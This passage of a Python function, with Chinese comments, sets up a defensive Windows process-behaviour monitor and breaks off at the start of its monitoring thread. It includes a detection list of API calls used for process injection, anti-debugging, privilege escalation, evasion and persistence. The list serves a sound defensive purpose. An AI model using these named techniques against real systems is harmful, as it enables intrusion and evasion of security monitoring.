def _process_behavior_monitor(self, pid: int = None, monitor_duration: int = 30, detection_level: str = "standard", alert_on_suspicious: bool = True) -> str:
    """
    进程行为监控器 - 实时分析进程的异常行为和威胁指标
    """
    try:
        import psutil
        import ctypes
        import ctypes.wintypes
        import threading
        import time
        from collections import defaultdict
        from datetime import datetime
        
        # Windows API 常量
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
        PROCESS_VM_OPERATION = 0x0008
        PROCESS_VM_WRITE = 0x0020
        PROCESS_CREATE_THREAD = 0x0002
        PROCESS_SUSPEND_RESUME = 0x0800
        PROCESS_TERMINATE = 0x0001
        TH32CS_SNAPPROCESS = 0x00000002
        TH32CS_SNAPMODULE = 0x00000008
        TH32CS_SNAPTHREAD = 0x00000004
        
        # 可疑API调用模式
        SUSPICIOUS_API_PATTERNS = {
            "injection": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "NtCreateThreadEx", "QueueUserAPC"],
            "debugging": ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess", "OutputDebugString"],
            "privilege": ["AdjustTokenPrivileges", "LookupPrivilegeValue", "OpenProcessToken", "SeDebugPrivilege"],
            "evasion": ["NtSetInformationProcess", "NtQuerySystemInformation", "ZwQuerySystemInformation"],
            "persistence": ["RegSetValueEx", "CreateService", "SchTasks", "CreateFile"]
        }
        
        class ProcessBehaviorReport:
            def __init__(self):
                self.pid = None
                self.name = None
                self.start_time = None
                self.suspicious_events = []
                self.api_calls = defaultdict(int)
                self.alert_count = 0
                self.risk_score = 0
                self.detected_techniques = []
                self.logs = []
                
        report = ProcessBehaviorReport()
        report.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 确定目标PID列表（如果指定）
        target_pid = pid
        report.pid = pid if pid else "ALL"
        if pid:
            try:
                proc = psutil.Process(pid)
                report.name = proc.name()
            except psutil.NoSuchProcess:
                return f"[ERROR] 进程 {pid} 不存在"
        else:
            report.name = "系统所有进程"
        
        report.logs.append(f"[*] 开始监控进程: {report.name} (PID: {report.pid})")
        report.logs.append(f"[*] 监控级别: {detection_level}, 持续时间: {monitor_duration} 秒")
        report.logs.append("-" * 60)
        
        # 监控线程 – 每次循环重新获取进程列表，避免迭代器耗尽
        def monitor_thread():
            start = time.time()
            
            # 局部去重：用 (pid, event_type) 做唯一键
